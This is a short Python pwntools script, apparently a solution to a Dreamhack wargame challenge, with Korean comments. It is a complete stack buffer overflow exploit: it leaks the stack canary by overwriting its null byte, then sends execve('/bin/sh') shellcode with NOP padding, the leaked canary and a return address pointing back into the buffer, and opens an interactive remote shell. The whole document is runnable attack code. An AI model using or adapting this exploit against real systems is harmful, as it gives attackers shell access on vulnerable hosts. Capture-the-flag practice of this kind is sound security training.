from pwn import *

p = remote("host3.dreamhack.games", 9955)

# buf 주소 => buf_addr
p.recvuntil(b"of the buf: ")
buf_addr = p.recvuntil(b'\n')
buf_addr = buf_addr[ : -1]
buf_addr = int(buf_addr, 16)

# buf~rbp 차이값 => dist
p.recvuntil(b"buf and $rbp: ")
dist = p.recvuntil(b'\n')
dist = dist[ : -1]
dist = int(dist)


# canary leak
pay = b'a' * (dist - 8 + 1)
p.sendafter(b"Input: ", pay)
p.recvuntil(pay)
canary = b''
canary += b'\x00'
canary += p.recv(7)

# Return Addr 조작
context.arch = 'amd64'
shellcode = shellcraft.execve("/bin/sh", 0, 0)
shellcode = asm(shellcode)
sl = len(shellcode)

# payload 구성
payload = b''
payload += shellcode
payload += b'\x90' * (dist - 8 - sl)
payload += canary
payload += b'r' * 8
payload += p64(buf_addr)

# payload send
p.sendlineafter(b"Input: ", payload)

p.interactive()